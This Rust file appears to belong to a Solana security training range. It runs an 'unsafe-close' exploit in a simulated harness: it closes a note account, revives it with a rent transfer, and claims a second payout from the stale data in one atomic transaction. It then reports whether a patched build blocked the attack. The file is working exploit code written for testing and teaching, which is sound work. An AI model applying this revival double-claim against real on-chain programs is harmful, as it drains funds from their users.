use solana_address::Address;
use solana_instruction::{AccountMeta, Instruction};
use solana_signer::Signer;
use solana_system_interface::{instruction as system_instruction, program as system_program};

use crate::{
    Mode,
    artifact::ensure_artifact,
    error::RangeError,
    harness::Harness,
    outcome::{AccountDelta, ExploitOutcome},
};

pub const SLUG: &str = "unsafe-close";
pub const PROGRAM_ID: Address = Address::new_from_array([0x53; 32]);

const OPEN: u8 = 0;
const CLAIM: u8 = 1;
const NOTE_LEN: usize = 40;
const CREDIT: u64 = 1_000_000_000;
const INITIAL_VAULT: u64 = 10_000_000_000;

pub fn program_id() -> Address {
    PROGRAM_ID
}

fn open_instruction(note: Address, authority: Address) -> Instruction {
    let mut data = Vec::with_capacity(9);
    data.push(OPEN);
    data.extend_from_slice(&CREDIT.to_le_bytes());
    Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(note, false),
            AccountMeta::new_readonly(authority, true),
        ],
        data,
    }
}

fn claim_instruction(note: Address, authority: Address, vault: Address) -> Instruction {
    Instruction {
        program_id: PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(note, false),
            AccountMeta::new(authority, true),
            AccountMeta::new(vault, false),
        ],
        data: vec![CLAIM],
    }
}

pub fn run(mode: Mode) -> Result<ExploitOutcome, RangeError> {
    let artifact = ensure_artifact(SLUG, mode)?;
    let mut harness = Harness::deploy(PROGRAM_ID, &artifact)?;

    let authority = Harness::keypair(0xA3);
    let note = Address::new_from_array([0x83; 32]);
    let vault = Address::new_from_array([0x73; 32]);
    let payer_address = harness.payer_address;
    let note_rent = harness.rent_exemption(NOTE_LEN);

    harness.set_account(note, note_rent, vec![0; NOTE_LEN], PROGRAM_ID)?;
    harness.set_account(vault, INITIAL_VAULT, Vec::new(), PROGRAM_ID)?;
    harness.set_account(
        authority.pubkey(),
        1_000_000_000,
        Vec::new(),
        system_program::ID,
    )?;

    harness
        .execute_signed(&[open_instruction(note, authority.pubkey())], &[&authority])
        .map_err(|error| RangeError::Broken {
            slug: SLUG,
            detail: format!("the open transaction failed: {error}"),
        })?;

    let vault_before = harness.lamports(&vault);
    let authority_before = harness.lamports(&authority.pubkey());

    // One atomic bundle: claim closes the note, the transfer revives the
    // zero-lamport ghost, and the second claim reads the stale data.
    let refund = system_instruction::transfer(&payer_address, &note, note_rent);
    let result = harness.execute_signed(
        &[
            claim_instruction(note, authority.pubkey(), vault),
            refund,
            claim_instruction(note, authority.pubkey(), vault),
        ],
        &[&authority],
    );
    let vault_after = harness.lamports(&vault);
    let authority_after = harness.lamports(&authority.pubkey());

    let changes = vec![
        AccountDelta::new("vault", vault_before, vault_after),
        AccountDelta::new("authority balance", authority_before, authority_after),
    ];

    match result {
        Ok(_) => {
            let expected_vault = vault_before.saturating_sub(2 * CREDIT);
            if vault_after != expected_vault {
                return Err(RangeError::Broken {
                    slug: SLUG,
                    detail: format!(
                        "the double claim succeeded but the vault balance is {vault_after}, \
                         expected {expected_vault}"
                    ),
                });
            }
            Ok(ExploitOutcome::succeeded(
                "the first claim closed the note, a transfer funded it, and the second claim paid again",
                changes,
            )
            .with_note(
                "the second claim succeeded because the close left the note's 40 bytes of \
                 authority and credit untouched",
            )
            .with_note(format!(
                "one transaction paid {CREDIT} twice from the same note"
            )))
        }
        Err(error) => {
            if vault_after != vault_before {
                return Err(RangeError::Broken {
                    slug: SLUG,
                    detail: format!(
                        "the rejected bundle changed the vault: {vault_before} -> {vault_after}"
                    ),
                });
            }
            Ok(ExploitOutcome::blocked(
                "the patched close cleared the note, so the bundled second claim reverted the transaction",
                format!("{error:?}"),
                changes,
            )
            .with_note("the vault stayed at its starting balance because the bundle is atomic"))
        }
    }
}
